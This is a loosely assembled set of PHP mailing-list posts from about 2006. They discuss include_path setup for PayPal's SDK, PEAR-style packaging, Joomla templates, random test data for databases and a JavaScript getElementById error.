Message-ID: <44CBCD6E.7020803@fdcx.net>

Fellow PHP'ers;

I've been developing with PHP for several years now with reasonable 
success.  Recently I'm trying to integrate PayPal's supplied SDK into an 
eCommerce app and I am having trouble with finding their own included 
modules.

I've tried studying the logic and use of the php.ini directive 
"include_path" and the only definition that seems to work is if I define 
the FULL path of every directory individually which makes for a very 
long, long path string.

For reference I have my includes directory outside of the document 
root(s) in something similar to /srv/www/sites/inc and for everything 
else this seems to work just fine.   Now PayPal's supplied tree is a 
continuation in this same directory and it itself includes nested 
directories so their top level would be at /srv/www/sites/inc/PayPal and 
then on down.

Again, if I define each and every lower directory individually in the 
path, things appear to work.  Otherwise, it finds nothing of PayPal.  
Oh, and further information, PayPal uses multiple nested includes within 
its supplied modules (whew!).

For some strange reason I thought that the include_path would be 
recursive but I guess not.

Someone in this group must have worked with the PayPal module(s) before 
and must have come up against the same situation.

Therefore, could someone in the know PLEASE explain how they overcame 
this situation or can someone at least advise how to best handle the 
definitions to accommodate this?

Subject: [nycphp-talk] include_path usage with PayPalPro SDK???

Normally w/ needed packages like those which don't follow the PEAR  
method is that I split it up and make it into a PEAR-like package  
(without the meta) ... for example for Cake I have:

/usr/lib/php/Cake.php
/usr/lib/php/Cake/all/the/other/crap.php
...

Then anytime its need I have one include path and just require 
('Cake.php');

You would basically fill up that file w/ all your are going to need.   
I beleive its more portable to do it this way but Ive heard of alot  
of people being very anti-pear which I still don't understand.  Ive  
switch to using Cake's /vendor path and placing any PEAR packages I  
need in there and bootstrapping that path via set_include_path 
(get_include_path() . ':/my/new/path')

I wish the include_path did have @ least some namespacing ability to  
it though, then your probably would be solve in saying something like  
use('PayPal') which is what the Cake framework does.

This might be fun.  I've got relatives in New Bedford and that's my 
birthday, so perhaps the wife and I can make a weekend of it.

But I have an ulterior motive.  I would like to sit in back and use my 
own framework to develop the same app that the "bake off" is cooking, 
then compare.  Hopefully I could pick up a few things from Cake and 
perhaps they'd pick up a few from me, no?

Message-ID: <44CE34AD.9050703@secdat.com>

Mitch (and everyone)

I was one of those guys that was seeing Joomla for the first time.  It 
was quite impressive.

Mitch, this may come as a surprise, but what most impressed my 
programmer and me were the templating possibilities.  We do 
line-of-business stuff and are not really in the market for CMS as 
commonly presented, but we thought it would be cool to be able to take 
commercially developed Joomla templates and refit them to be the public 
face of some of our sites. 

I am going to try this out and will let you know how it goes.

People interested in installation and distribution tools should definitely 
take a look at PEAR's 1.4.x platform.  It's quite robust and has a lovely 
feature set.  The biggest new thing in 1.4.x is channels (well, 1.4 has 
been out a while, so perhaps "new" isn't the right word).

With channels, anyone can host a code repository accessible via end 
users's PEAR installers.  This makes it really easy to keep your clients 
up to date.

I know you must have thought of the following, but what's the problem with 
it?

<?php
$rows = 55;
for ($i = 0, $i < $rows, $i++) {
    query('insert into foo values (...)');
}

Or just have test rows in your table creation script.

I have the same issue, there are many occasions where I need to test my 
scripts with valid but random data from a database.  I haven't run 
across any scripts that can offer "random" data to be inserted into a 
table on a whim.

I've actually considered writing a script to do this for me, but a few 
of the issues that would have to be overcome include intelligently 
inserting the information so that it accurately reflects data in related 
tables (e.g. order_items table would have to relate back to a valid 
order_id in an orders table, etc.)...

I was thinking about writing a script that would do a quick google 
search, follow the site links and grab chunks of data based on a set of 
rules...  still, a bit of a pain.

Has anyone run across something that already does this?

Sorry - I know this is most likely a js issue but it seems to be 
occurring in only ONE of my PHP programs so I thought I would ask here 
because of the VAST amount of insight and expertise available...

I am trying desperately to incorporate a free js routine that hides a 
DIV and then redisplays it when asked using DHTML. (too, too many 
technologies!!!)

This is a canned routine included with a <script src...> statement in 
the appropriate place.  When I try to run the program my js console 
shows the following error ONLY in this ONE PHP program.  SO, what might 
I be doing within this program to cause this js error? (rhetorical)

Can someone perhaps "explain" what this error is trying to tell me and 
how my PHP program can cause it???

Error: document.getElementById("Div" + count) has no properties
Source File: http://www1.xxxxxxxxxxx.com/openpopups.js
Line: 320

Any assistance, pointers, redirection, etc will be G-R-E-A-T-L-Y 
appreciated!

Thank you,

Bob

+100,000 answers to that on google.  :-)

"The most common cause of getElementById having no properties is when
you try to access the properties before the page finishes loading."

You're certainly not talking about me, but I'll answer anyway. :-)

Bob:

You said "when asked" -- what's triggering the event? If it's a users 
click to a link, then ajax would certainly work to change the 
contents between div's.

For an example, please review:

http://xn--ovg.com/ajax

As for the error, you might try:

document.getElementById("Div" + count).innerHTML

Like Ed says, it could be that the javascript is called before the page 
has finished rendering the element that has the id you're trying to grab.

It also could just be that the id doesn't exist on the page at all.

i.e. if count is set to 6 and there's no div on the page that has it's 
id set to Div6 like this:
<div id="Div6"> stuff in here </div>

Then
document.getElementById("Div" + count)
doesn't find anything.

The full line is probably something like
document.getElementById('Div" + count).style.display = 'none';

The extra .style.display means it is trying to access that property of 
what document.getElementById('Div" + count) is returning.  It's not 
finding an element with that id which is why the error says that it 
doesn't have any properties.

Are you the one adding the id's to the divs in your html or php?  If 
not, it might be getting automatically done by your javascript and 
perhaps you've manually added an id to a div and is conflicting with the 
javascript's auto handling of it?  Just taking stabs in the dark here... 
  Might be able to help more if I saw the code.

<aside>Anyone else notice that example link actually goes to porn site? 
Too funny...</aside>
